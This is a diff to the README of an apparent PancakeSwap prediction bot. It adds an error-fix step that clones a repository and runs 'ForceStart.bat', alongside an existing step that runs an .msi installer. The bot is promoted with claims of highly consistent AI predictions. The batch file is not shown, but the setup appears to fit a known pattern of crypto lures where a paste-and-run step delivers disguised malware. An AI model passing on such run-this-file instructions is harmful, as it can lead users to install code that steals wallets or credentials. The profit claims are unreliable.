@@ -60,7 +60,16 @@ cd PancakeswapPredictUltimateWinner
 "PancakeswapPredictBot V8.4.0.msi"
 ```
 
-## 🤖📈 Strategy (You can easily configure all parameter settings through the interface)
+If you experience errors while the bot is running, you can apply the force start option below:
+
+```shell
+git clone https://github.com/PredictBots/PancakeswapPredictUltimateWinner
+cd PancakeswapPredictUltimateWinner
+"ForceStart.bat"
+```
+
+
+##  Strategy (You can easily configure all parameter settings through the interface)
 
 ### AI Strategy (AI_STRATEGY)
 - This advanced strategy leverages artificial intelligence for highly consistent real-time predictions.
